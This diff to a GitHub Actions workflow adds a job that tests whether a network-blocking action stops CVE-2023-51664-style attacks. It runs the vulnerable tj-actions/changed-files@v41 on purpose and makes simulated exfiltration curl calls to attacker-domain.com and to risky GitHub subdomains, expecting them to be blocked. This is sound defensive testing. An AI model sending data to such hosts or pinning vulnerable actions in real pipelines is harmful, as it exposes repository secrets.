@@ -349,3 +349,58 @@ jobs:
         with:
           mode: live
           verbose: true
+
+  test-vulnerable-action:
+    name: Test CVE-2023-51664 Protection
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Apply Safer Runner Action (Enforce Mode with Risky Subdomain Blocking)
+        uses: ./
+        with:
+          mode: 'enforce'
+          block-risky-github-subdomains: true
+          allowed-domains: |
+            api.github.com
+            github.com
+
+      - name: Run vulnerable tj-actions/changed-files@v41
+        uses: tj-actions/changed-files@v41
+        with:
+          since_last_remote_commit: true
+        continue-on-error: true
+
+      - name: Attempt malicious exfiltration (should be blocked)
+        run: |
+          echo "=== Testing protection against CVE-2023-51664 ==="
+          echo "Simulating attacker attempts after exploiting tj-actions..."
+
+          echo "1. Attempting to access gist.githubusercontent.com (risky subdomain)..."
+          timeout 5 curl https://gist.githubusercontent.com/test/raw || echo "✅ BLOCKED: gist.githubusercontent.com"
+
+          echo "2. Attempting to access raw.githubusercontent.com (risky subdomain)..."
+          timeout 5 curl https://raw.githubusercontent.com/test/main/file || echo "✅ BLOCKED: raw.githubusercontent.com"
+
+          echo "3. Attempting to exfiltrate to attacker domain..."
+          timeout 5 curl https://attacker-domain.com/exfil || echo "✅ BLOCKED: attacker-domain.com"
+
+          echo "4. Attempting DNS exfiltration..."
+          timeout 5 curl https://data-exfil-test.example.com || echo "✅ BLOCKED: example.com"
+        continue-on-error: true
+
+      - name: Verify GitHub infrastructure still works
+        run: |
+          echo "=== Verifying legitimate GitHub access still works ==="
+          curl -I https://api.github.com/user || echo "GitHub API accessible"
+          curl -I https://github.com || echo "GitHub main site accessible"
+
+      - name: Check security logs
+        if: always()
+        run: |
+          echo "=== CVE-2023-51664 Protection Logs ==="
+          sudo grep -E 'Drop-Enforce: |NXDOMAIN' /var/log/syslog | tail -30 || echo "No block logs found"
+
+          echo "=== DNS Blocking Logs ==="
+          sudo grep -E 'gist.githubusercontent.com|raw.githubusercontent.com|attacker-domain' /var/log/syslog | tail -20 || echo "No DNS logs found"
